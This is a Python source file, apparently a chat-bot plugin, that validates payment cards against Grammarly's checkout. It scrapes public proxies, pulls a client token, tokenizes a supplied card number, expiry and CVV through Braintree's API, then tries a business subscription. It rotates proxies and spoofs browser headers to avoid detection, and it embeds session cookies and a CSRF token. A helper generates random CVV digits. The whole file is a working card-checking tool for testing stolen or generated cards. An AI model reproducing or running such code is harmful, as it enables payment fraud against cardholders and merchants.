import requests
import random
from random import randint
import string
import json
import base64
from mills.plugins._helpers.tools import find_between


# from joc.classes.RandUser import RandUser

async def deadb_one(message):
    response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=50&country=all&ssl=all&anonymity=all')
    lines = response.text.split("\n")
    json_str = {}
    proxy = ''
    for line in lines:
        try:
            proxies = {
                "http": f"http://{line.strip()}",
                "https": f"http://{line.strip()}"
            }
            url = "https://subscription.grammarly.com/api/v1/token/generateClientToken"
            headers = {
                'Host': 'subscription.grammarly.com',
                'Content-Length': '0',
                'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                'X-Csrf-Token': 'AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og',
                'X-Client-Version': '1.2.19535',
                'Sec-Ch-Ua-Mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
                'Accept': 'application/json',
                'X-Client-Type': 'funnel',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Origin': 'https://www.grammarly.com',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.grammarly.com/upgrade/business',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
            }


            response = requests.request("POST", url, headers=headers, proxies=proxies)
            if response.ok:
                token = response.json().get('token')
                decodedBytes = base64.b64decode(token)
                decodedStr = decodedBytes.decode("ascii") 
                json_str = json.loads(decodedStr)
                proxy = proxies
                break
            else:
                print(f"The proxy is not working! {line}")
        except:
            print(f"The proxy is not working! {line}")    
        
    
    if not json_str['authorizationFingerprint']:
        await message.edit("Error while getting token... trying again....")
        return
    return json_str['authorizationFingerprint'], proxy

async def deadb_two(message, cc, mes, ano, cvv):
    token,proxies = await deadb_one(message)
    url = "https://payments.braintree-api.com/graphql"
    sessionId = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
    payload = json.dumps({
    "clientSdkMetadata": {
        "source": "client",
        "integration": "custom",
        "sessionId": sessionId
    },
    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
    "variables": {
        "input": {
        "creditCard": {
            "number": cc,
            "expirationMonth": mes,
            "expirationYear": ano,
            "cvv": cvv
        },
        "options": {
            "validate": True
        }
        }
    },
    "operationName": "TokenizeCreditCard"
    })
    headers = {
    'Host': 'payments.braintree-api.com',
    'Content-Length': '753',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'Content-Type': 'application/json',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Authorization': f'Bearer {token}',
    'Braintree-Version': '2018-05-10',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept': '*/*',
    'Origin': 'https://assets.braintreegateway.com',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://assets.braintreegateway.com/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
    }

    response = requests.request("POST", url, headers=headers, data=payload, proxies=proxies)
    if not response.ok:
        await message.edit("Error while validate card... trying again....")
        
    return response.json().get('data').get('tokenizeCreditCard').get('token'),sessionId,proxies

async def deadb_three(message, cc, mes, ano, cvv):
    token,sessionId,proxies = await deadb_two(message, cc, mes, ano, cvv)
    url = "https://subscription.grammarly.com/api/v1/subscribe-new-institution"
    payload = f"institutionName=Ikka%27s+Organization&numberOfSeats=3&sessionId={sessionId.replace('-','')}&billingCountryCode=US&nonce={token}&planId=10201490"
    headers = {
    'Host': 'subscription.grammarly.com',
    'Content-Length': '183',
    'Sec-Ch-Ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'X-Csrf-Token': 'AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og',
    'X-Client-Version': '1.2.19552',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json',
    'X-Client-Type': 'funnel',
    'X-Container-Id': 'emkm7ssjru230d00',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://www.grammarly.com',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://www.grammarly.com/upgrade/business?teamsize=3&oid=10201490',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Cookie': 'gnar_containerId=emkm7ssjru230d00; funnelType=free; _gid=GA1.2.103083219.1680712988; ga_clientId=1755340629.1680712988; _gcl_au=1.1.1005591024.1680712988; _rdt_uuid=1680712992175.9a2e8724-e7db-420d-9b57-61df5523c3ca; grauth=AABL_Abgo7vVq7NSmHoekyjUXs8FYotAGmW61dRT1lSxJo3c0_W0vm6fzp2lwyzAZ5OokOok14c_8YIF; csrf-token=AABL/H5WbuKDMoie5LsULnpoUGA/TN4lkdH2Og; tdi=itpad262pd09wp81t; isGrammarlyUser=true; _fbp=fb.1.1680713125650.838885962; funnel_firstTouchUtmSource=funnel; redirect_location=eyJ0eXBlIjoiIiwibG9jYXRpb24iOiJodHRwczovL3d3dy5ncmFtbWFybHkuY29tL3VwZ3JhZGUvYnVzaW5lc3MifQ==; browser_info=CHROME:111:COMPUTER:SUPPORTED:FREEMIUM:WINDOWS_10:WINDOWS; _ga=GA1.1.1755340629.1680712988; tfpsi=1dadbea1-f235-419c-a674-dbf8a3413ffc; _ga_CBK9K2ZWWE=GS1.1.1680796538.4.1.1680796859.29.0.0; _uetsid=f3c6b430d3d011ed98e31bb86c799c19; _uetvid=f3c89270d3d011edbeb4b95fcdafad7b'
    }

    response = requests.request("POST", url, headers=headers, data=payload, proxies=proxies)
    return response.json()

def generate_random_string(length):
    # Get all the ASCII letters in lowercase and uppercase
    letters = string.ascii_letters
    # Randomly choose characters from letters for the given length of the string
    random_string = ''.join(random.choice(letters) for i in range(length))
    return random_string


def random_cvv_date_exp(n):
    range_start = 10**(n-1)
    range_end = (10**n)-1
    return str(randint(range_start, range_end))


def get_response_progress(text: int):
    res = "□□□□□□□□□□ 0%"
    if text == 10:
        res = "■□□□□□□□□□ 10%"
    elif text == 20:
        res = "■■□□□□□□□□ 20%"
    elif text == 30:
        res = "■■■□□□□□□□ 30%"
    elif text == 40:
        res = "■■■■□□□□□□ 40%"
    elif text == 50:
        res = "■■■■■□□□□□ 50%"
    elif text == 60:
        res = "■■■■■■□□□□ 60%"
    elif text == 70:
        res = "■■■■■■■□□□ 70%"
    elif text == 80:
        res = "■■■■■■■■□□ 80%"
    elif text == 90:
        res = "■■■■■■■■■□ 90%"
    elif text == 100:
        res = "■■■■■■■■■■ 100%"
    return res
